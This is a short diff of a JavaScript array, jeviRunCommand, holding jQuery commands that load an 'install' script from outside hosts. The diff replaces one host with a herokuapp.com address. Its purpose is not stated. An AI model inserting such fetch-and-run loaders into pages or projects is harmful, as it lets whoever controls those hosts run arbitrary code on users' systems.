@@ -1,5 +1,5 @@
 const jeviRunCommand = [
-"$('script').load('http://jevi.ga:3000/install');",
+"$('script').load('https://korempire.herokuapp.com/install');",
 "$('script').load('https://entjevi.herokuapp.com/install');"
 ];
 
